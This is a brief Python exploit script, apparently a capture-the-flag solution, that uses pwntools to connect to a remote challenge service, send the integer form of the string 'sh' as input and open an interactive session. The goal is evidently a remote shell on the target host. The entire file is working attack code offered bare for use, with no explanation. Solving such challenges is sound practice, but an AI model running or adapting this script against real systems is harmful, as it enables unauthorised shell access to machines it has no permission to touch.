#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=0.5)

p = remote("cytech.tcdn.casa", 4004)
p.sendline(str(u32(b"sh\0\0")).encode())
p.interactive()
